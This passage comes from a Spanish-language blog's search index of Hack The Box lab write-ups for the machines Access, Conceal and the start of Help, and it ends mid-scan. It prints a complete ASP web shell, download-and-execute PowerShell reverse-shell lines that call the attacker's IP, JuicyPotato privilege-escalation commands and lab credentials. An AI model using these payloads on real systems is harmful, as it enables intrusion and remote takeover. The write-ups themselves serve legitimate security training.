ms 10.10.12.1 (10.10.12.1) 2 340.87 ms 10.10.10.98 (10.10.10.98) NSE: Script Post-scanning. Initiating NSE at 21:19 Completed NSE at 21:19, 0.00s elapsed Initiating NSE at 21:19 Completed NSE at 21:19, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 646.94 seconds Raw packets sent: 131457 (5.788MB) | Rcvd: 537 (26.626KB) HTTP Se utilizo la herramienta gobuster para realizar una busqueda de archivos, directorios, etc. dentro del sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@sckull:~/htb/access# gobuster -u http://10.10.10.98/ -w /usr/share/wordlists/dirb/common.txt -np -x asp,aspx,txt,html -t 15 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.98/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : aspx,txt,html,asp [+] Timeout : 10s ===================================================== 2019/03/03 02:43:38 Starting gobuster ===================================================== /Index.html (Status: 200) No encontramos mucho para poder explorar mas que solo el index.html.\nFTP Iniciamos sesion en el servicio FTP con el usuario y contraseña \u0026lsquo;anonymous\u0026rsquo;. Dentro de este encontramos dos carpetas y dos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 root@sckull:~/htb/access# ftp 10.10.10.98 Connected to 10.10.10.98. 220 Microsoft FTP Service Name (10.10.10.98:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls -la 200 PORT command successful. 150 Opening ASCII mode data connection. 08-23-18 08:16PM \u0026lt;DIR\u0026gt; Backups 08-24-18 09:00PM \u0026lt;DIR\u0026gt; Engineer 226 Transfer complete. ftp\u0026gt; cd Backups 250 CWD command successful. ftp\u0026gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-23-18 08:16PM 5652480 backup.mdb 226 Transfer complete. ftp\u0026gt; bin 200 Type set to I. ftp\u0026gt; get backup.mdb local: backup.mdb remote: backup.mdb 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 5652480 bytes received in 147.73 secs (37.3663 kB/s) ftp\u0026gt; cd ../Engineer 250 CWD command successful. ftp\u0026gt; ls -lah 200 PORT command successful. 125 Data connection already open; Transfer starting. 08-24-18 12:16AM 10870 Access Control.zip 226 Transfer complete. ftp\u0026gt; get Access\\ Control.zip local: Access Control.zip remote: Access Control.zip 200 PORT command successful. 150 Opening BINARY mode data connection. 226 Transfer complete. 10870 bytes received in 4.72 secs (2.2477 kB/s) ftp\u0026gt; quit 221 Goodbye. root@sckull:~/htb/access# ls \u0026#39;Access Control.zip\u0026#39; backup.mdb Ahora tenemos dos archivos \u0026lsquo;Access Control.zip\u0026rsquo; y \u0026lsquo;mdb\u0026rsquo;.\nAnalizando los archivos de que obtuvimos en FTP, encontramos que backup.mdb es un archivo de Microsoft Access Database y Access Control.zip al intentar descomprimir los archivos dentro, nos pide una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 root@sckull:~/htb/access# file backup.mdb backup.mdb: Microsoft Access Database root@sckull:~/htb/access# file \u0026#39;Access Control.zip\u0026#39; Access Control.zip: Zip archive data, at least v2.0 to extract root@sckull:~/htb/access# binwalk \u0026#39;Access Control.zip\u0026#39; DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, encrypted at least v2.0 to extract, compressed size: 10678, uncompressed size: 271360, name: Access Control.pst 10848 0x2A60 End of Zip archive, footer length: 22 mdb En el primer archivo utilizamos la pagina \u0026lsquo;https://www.mdbopener.com/' para realizar alguna busqueda de datos que nos pudiesen ayudar de alguna forma en algun otro servicio y encontramos una base de datos de lo que parece ser de una empresa, nos centramos en datos de usuarios y contraseñas y econtramos una tabla que se hace llamar \u0026lsquo;auth_user\u0026rsquo; con los siguientes datos:\nTABLAS auth_user Utilizando la contraseña \u0026lsquo;access4u@security\u0026rsquo; para descomprimir los archivos que \u0026lsquo;Access Control.zip\u0026rsquo; contiene, encontramos un archivo \u0026lsquo;Access Control.pst\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@sckull:~/htb/access# 7z x \u0026#39;Access Control.zip\u0026#39; 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 10870 bytes (11 KiB) Extracting archive: Access Control.zip -- Path = Access Control.zip Type = zip Physical Size = 10870 Enter password (will not be echoed): Everything is Ok Size: 271360 Compressed: 10870 root@sckull:~/htb/access# ls \u0026#39;Access Control.pst\u0026#39; Utilizando readpst para lectura del archivo, nos genera un archivo de tipo mbox.\n1 2 3 4 5 6 7 root@sckull:~/htb/access# readpst \u0026#39;Access Control.pst\u0026#39; Opening PST file and indexes... Processing Folder \u0026#34;Deleted Items\u0026#34; \u0026#34;Access Control\u0026#34; - 2 items done, 0 items skipped. root@sckull:~/htb/access# ls \u0026#39;Access Control.mbox\u0026#39; Para lectura de este archivo utilizamos \u0026lsquo;mail -f Access Control.mbox\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 root@sckull:~/htb/access# mail -f Access\\ Control.mbox Status: RO From: john@megacorp.com \u0026lt;john@megacorp.com\u0026gt; Subject: MegaCorp Access Control System \u0026#34;security\u0026#34; account To: \u0026#39;security@accesscontrolsystems.com\u0026#39; Date: Thu, 23 Aug 2018 23:44:07 +0000 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary=\u0026#34;--boundary-LibPST-iamunique-387867163_-_-\u0026#34; ----boundary-LibPST-iamunique-387867163_-_- Content-Type: multipart/alternative; boundary=\u0026#34;alt---boundary-LibPST-iamunique-387867163_-_-\u0026#34; --alt---boundary-LibPST-iamunique-387867163_-_- Content-Type: text/plain; charset=\u0026#34;utf-8\u0026#34; Hi there, The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers. Regards, John .... Telnet - Obteniendo Acceso Como pudimos observar el archivo \u0026lsquo;Access Control.mbox\u0026rsquo; es un archivo que contiene un email, dentro de el John nos indica que la contraseña para el usuario \u0026lsquo;security\u0026rsquo; fue cambiada a \u0026lsquo;4Cc3ssC0ntr0ller\u0026rsquo;. Aprovechando estos datos procedemos a utilizar el servicio telnet para conectarnos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 root@sckull:~/htb/access# telnet 10.10.10.98 Trying 10.10.10.98... Connected to 10.10.10.98. Escape character is \u0026#39;^]\u0026#39;. Welcome to Microsoft Telnet Service login: security password: *=============================================================== Microsoft Telnet Server. *=============================================================== C:\\Users\\security\u0026gt;cd Desktop C:\\Users\\security\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of C:\\Users\\security\\Desktop 03/03/2019 03:12 AM \u0026lt;DIR\u0026gt; . 03/03/2019 03:12 AM \u0026lt;DIR\u0026gt; .. 03/03/2019 03:12 AM 73,802 shell.exe 08/21/2018 10:37 PM 32 user.txt 2 File(s) 73,834 bytes 2 Dir(s) 16,771,272,704 bytes free C:\\Users\\security\\Desktop\u0026gt;more user.txt ff1f3b4[...] C:\\Users\\security\\Desktop\u0026gt; Y asi obtenemos nuestra primera bandera user.txt.\nPrivilege Escalation Enumerando archivos y directorios no encontramos nada, pero al utilizar el comando cmdkey /list encontramos que el usuario Administrator tiene una contraseña guardada.\n1 2 3 4 5 6 7 8 9 10 C:\\Users\\security\\Links\u0026gt;cmdkey /list Currently stored credentials: Target: Domain:interactive=ACCESS\\Administrator Type: Domain Password User: ACCESS\\Administrator C:\\Users\\security\\Links\u0026gt; Metasploit \u0026amp; Msfvenom Utilizamos runas para ejecutar comandos con el usuario Administrator y con la contraseña guardada. Primero generamos nuestro payload con msfvenom, configuramos a la escucha nuestro exploit finalmente ejecutamos un pequeño servidor con python.\nRUN PAYLOAD - RUNAS Teniendo nuestro entorno local listo, procedemos a descargar nuestro payload a la maquina y ejecutarlo con \u0026lsquo;runas\u0026rsquo;.\nSe muestra la solicitud de descarga en el servidor python.\nSesion Shell En nuestro entorno local obtenemos una sesion con privilegios de administracion y la flag root.txt.\nRUNAS - ss64 ","description":"Access con Sistema Operativo Windows y dificultad facil, presenta un servicio FTP el cual contiene una base de datos donde encontramos un correo electronico con credenciales que utilizamos en Telnet. Utilizando las credenciales guardadas ejecutamos un payload de metasploit para obtener acceso privilegiado.","id":213,"section":"posts","tags":["ftp","readpst","telnet","runas"],"title":"Hack The Box - Access","uri":"https://sckull.github.io/posts/access/"},{"content":"\rConceal expone el puerto SNMP donde obtuvimos informacion para generar la configuracion para una VPN y posteriormente conectarnos a esta. Obtuvimos acceso a la maquina con una web shell en FTP que luego actualizamos a una shell de PowerShell. SetImpersonatePrivilege es el privilegio que explotamos con Juicy Potato para escalar privilegios.\nNombre Conceal OS Windows Puntos 40 Dificultad Dificil IP 10.10.10.116 Maker bashlogic\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.8, 7.5, 6.8, 3.2, 2.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN 1 2 3 4 5 6 7 masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-27 00:03:27 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 161/udp on 10.10.10.116\u0026lt;/pre\u0026gt; SNMP PORT Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.\n1 2 3 4 5 6 7 8 9 10 [*] System information: Host IP : 10.10.10.116 Hostname : Conceal Description : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free) Contact : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43 Location : - Uptime snmp : 00:10:11.23 Uptime system : 00:09:45.96 System date : 2019-3-2 04:26:04.7 IKE VPN password PSK Utilizamos el wordlist rockyou y hashcat para desencriptar la contraseña.\n1 9c8b1a372b1878851be2c097031b6e43 NTLM : Dudecake1! IKE VPN SETUP IPSEC - IKE VPN Utilizamos strongswan para poder conectarnos mediante una VPN IKE y su configuracion es la siguiente.\nInstalamos strongswan:\n1 sudo apt install strongswan Configuramos los siguientes archivos.\n[/etc/ipsec.conf]\n1 2 3 4 5 6 7 8 9 10 conn conceal authby=secret auto=route ike=3des-sha1-modp1024 left=10.10.12.184 right=10.10.10.116 keyexchange=ikev1 type=transport esp=3des-sha1 rightprotoport=tcp [/etc/ipsec.secrets]\n1 2 10.10.12.184 : PSK \u0026#34;Dudecake1!\u0026#34; 10.10.10.116 : PSK \u0026#34;Dudecake1!\u0026#34; STATUS IPSEC NMAP - IPSEC SMB - IPSEC RPC - IPSEC FTP - IPSEC Nos conectamos como usuario anonymous pero no encontramos nada dentro.\nHTTP - IPSEC Enumerando con gobuster encontramos solo una direccion.\n/upload WEBSHELL Para obtener una webshell utilizamos ftp para subir nuestra webshell y visitar /upload/cmd.asp para interactuar con este.\nWEBSHELL https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;% Set oScript = Server.CreateObject(\u0026#34;WSCRIPT.SHELL\u0026#34;) Set oScriptNet = Server.CreateObject(\u0026#34;WSCRIPT.NETWORK\u0026#34;) Set oFileSys = Server.CreateObject(\u0026#34;Scripting.FileSystemObject\u0026#34;) Function getCommandOutput(theCommand) Dim objShell, objCmdExec Set objShell = CreateObject(\u0026#34;WScript.Shell\u0026#34;) Set objCmdExec = objshell.exec(thecommand) getCommandOutput = objCmdExec.StdOut.ReadAll end Function %\u0026gt; \u0026lt;HTML\u0026gt; \u0026lt;BODY\u0026gt; \u0026lt;FORM action=\u0026#34;\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;cmd\u0026#34; size=45 value=\u0026#34;\u0026lt;%= szCMD %\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Run\u0026#34;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;PRE\u0026gt; \u0026lt;%= \u0026#34;\\\\\u0026#34; \u0026amp; oScriptNet.ComputerName \u0026amp; \u0026#34;\\\u0026#34; \u0026amp; oScriptNet.UserName %\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_name\u0026#34;))%\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s port:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_port\u0026#34;))%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s software:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;server_software\u0026#34;))%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;The server\u0026#39;s software:\u0026lt;/b\u0026gt; \u0026lt;%Response.Write(Request.ServerVariables(\u0026#34;LOCAL_ADDR\u0026#34;))%\u0026gt; \u0026lt;% szCMD = request(\u0026#34;cmd\u0026#34;) thisDir = getCommandOutput(\u0026#34;cmd /c\u0026#34; \u0026amp; szCMD) Response.Write(thisDir)%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/BODY\u0026gt; \u0026lt;/HTML\u0026gt; Obtenemos nuestra webshell y podemos ejecutar comandos en la maquina.\nREVERSE SHELL - Nishang Utilizamos una de las shells que tiene Nishang, y configuramos un archivo asp para subirlo por ftp y al visitar dicho archivo obtener una shell inversa.\nEn nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la sigueinte linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.\n1 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.188 -Port 443 Nuestro archivo rev_shell.asp contiene lo siguiente.\n1 2 3 4 \u0026lt;%@ Language=VBScript %\u0026gt; \u0026lt;% call Server.CreateObject(\u0026#34;WSCRIPT.SHELL\u0026#34;).Run(\u0026#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.188/Invoke-PowerShellTcp.ps1\u0026#39;)\u0026#34;) %\u0026gt; USER Obtenemos nuestra bandera user.txt.\nSysteminfo Sherlok Utilizando Sherlok para buscar parches que nos pueda servir para escalar privilegios, no encontramos ninguno :/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 PS C:\\Users\\Destitute\\Documents\u0026gt; iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.188/Sherlok.ps1\u0026#39;) PS C:\\Users\\Destitute\\Documents\u0026gt; ls PS C:\\Users\\Destitute\\Documents\u0026gt; Find-Allvulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Not Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135 VulnStatus : Not Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html VulnStatus : Not Vulnerable WHOAMI /priv Revisamos si SeImpersonatePrivilege esta disponible en la maquina y con el usuario que actualmente tenemos una shell para poder utilizar JuicyPotato para obtener NT AUTHORITY\\SYSTEM.\nPRIVILEGE ESCALATION - JuicyPotato Para escalar privilegios vamos a utilizar un nuevo documento Invoke-PowerShellTcp-potato.ps1 que contiene una shell inversa, tambien un archivo reverse_shell.bat el cual va ser ejecutado por JuicyPotato.exe.\nJuicy Potato reverse_shell.bat\n1 powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.12.64/Invoke-PowerShellTcp-potato.ps1\u0026#39;) CLSID Para obtener CLSID para juicypotato vamos a utilizar los siguientes comandos en powershell.\n1 2 3 New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT $CLSID = Get-ItemProperty HKCR:\\clsid\\* | select-object AppID,@{N=\u0026#39;CLSID\u0026#39;; E={$_.pschildname}} | where-object {$_.appid -ne $null} $CLSID Nos imprimira un alista de AppID y CLSID, copiamos y guardamos los CLSID en un archivo para probar cada uno de ellos con el archivo test_clsid.bat de juicypotato.\nVamos a hacer un pequeño cambio en nuestro archivo test_clsid.bat, solo cambiamos la ruta de nuestros archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 @echo off :: Starting port, you can change it set /a port=10000 SETLOCAL ENABLEDELAYEDEXPANSION FOR /F %%i IN (C:\\Users\\Destitute\\Videos\\tmp.list) DO ( echo %%i !port! C:\\Users\\Destitute\\Videos\\JuicyPotato.exe -z -l !port! -c %%i \u0026gt;\u0026gt; C:\\Users\\Destitute\\Videos\\result.log set RET=!ERRORLEVEL! :: echo !RET! if \u0026#34;!RET!\u0026#34; == \u0026#34;1\u0026#34; set /a port=port+1 ) Descargamos los archivos necesarios en la maquina.\nEjecutamos test_clsid.bat, el cual nos creara un archivo log (result.log) con las pruebas de CLSID que hay en la lista que creamos anteriormente.\nLista CLSID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 7c5-91bf-4547-81ae-fec91a89dec5};CONCEAL\\Destitute {0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\\LOCAL SERVICE {1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\\LOCAL SERVICE {204810b9-73b2-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {2e5e84e9-4049-4244-b728-2d24227157c7};NT AUTHORITY\\LOCAL SERVICE {30766BD2-EA1C-4F28-BF27-0B44E2F68DB7};NT AUTHORITY\\SYSTEM {42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\\SYSTEM {42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\\SYSTEM {4661626C-9F41-40A9-B3F5-5580E80CB347};NT AUTHORITY\\SYSTEM {4B6C85F1-A6D9-433A-9789-89EA153626ED};NT AUTHORITY\\SYSTEM {6d8ff8d2-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8dc-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8dd-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8df-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e1-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e5-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {6d8ff8e7-730d-11d4-bf42-00b0d0118b56};NT AUTHORITY\\LOCAL SERVICE {7D096C5F-AC08-4F1F-BEB7-5C22C517CE39};NT AUTHORITY\\SYSTEM {8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\\SYSTEM {9678f47f-2435-475c-b24a-4606f8161c16};CONCEAL\\Destitute {97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\\SYSTEM {98068995-54d2-4136-9bc9-6dbcb0a4683f};CONCEAL\\Destitute {9acf41ed-d457-4cc1-941b-ab02c26e4686};CONCEAL\\Destitute {9E175B68-F52A-11D8-B9A5-505054503030};NT AUTHORITY\\SYSTEM {9E175B6D-F52A-11D8-B9A5-505054503030};NT AUTHORITY\\SYSTEM {A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\\LOCAL SERVICE {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6};NT AUTHORITY\\SYSTEM {B31118B2-1F49-48E5-B6F5-BC21CAEC56FB};NT AUTHORITY\\SYSTEM {B52D54BB-4818-4EB9-AA80-F9EACD371DF8};NT AUTHORITY\\SYSTEM {C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\\SYSTEM {C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\\SYSTEM {CBC04AF1-25C7-4A4D-BB78-28284403510F};NT AUTHORITY\\SYSTEM {E48EDA45-43C6-48e0-9323-A7B2067D9CD5};NT AUTHORITY\\SYSTEM {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\\SYSTEM {E63DE750-3BD7-4BE5-9C84-6B4281988C44};NT AUTHORITY\\SYSTEM {FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\\SYSTEM Vamos a utilizar un CLSID ({FFE1E5FE-F1F0-48C8-953E-72BA272F2744}) con NT AUTHORITY\\SYSTEM y una shell inversa (reverse_shell.bat).\n1 .\\JuicyPotato.exe -l 1227 -p C:\\Users\\Destitute\\Videos\\reverse_shell.bat -t * -c \u0026#39;{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};\u0026#39; De igual manera podemos utilizar uno de la lista que JuicyPotato tiene en su lista de Windows 10 Enterprise (https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise).\nROOT Obtenemos una shell NT AUTHORITY\\SYSTEM o root :)\nY nuestra bandera root.txt.\n","description":"Conceal expone el puerto SNMP donde obtuvimos informacion para generar la configuracion para una VPN y posteriormente conectarnos a esta. Obtuvimos acceso a la maquina con una web shell en FTP que luego actualizamos a una shell de PowerShell. SetImpersonatePrivilege es el privilegio que explotamos con Juicy Potato para escalar privilegios.","id":214,"section":"posts","tags":["snmp","nishang","juicy potato"],"title":"Hack The Box - Conceal","uri":"https://sckull.github.io/posts/conceal/"},{"content":"\rEncontramos HelpDeskZ y una vulnerabilidad la cual permite adivinar el nombre de un fichero subido lo que nos dio acceso a la maquina. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.\nNombre Help OS Linux Puntos 20 Dificultad Facil IP 10.10.10.121 Maker cymtrick\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.1, 7.1, 7.7, 2.3, 2.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 8, 8, 2, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 Nmap 7.70 scan initiated Sat Jan 19 23:53:49 2019 as: nmap -sV -A -sC -o nmap.tcp 10.10.10.121 Nmap scan report for 10.10.10.121 Host is up (0.20s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=1/19%OT=22%CT=1%CU=32374%PV=Y%DS=2%DC=T%G=Y%TM=5C440D3 OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN 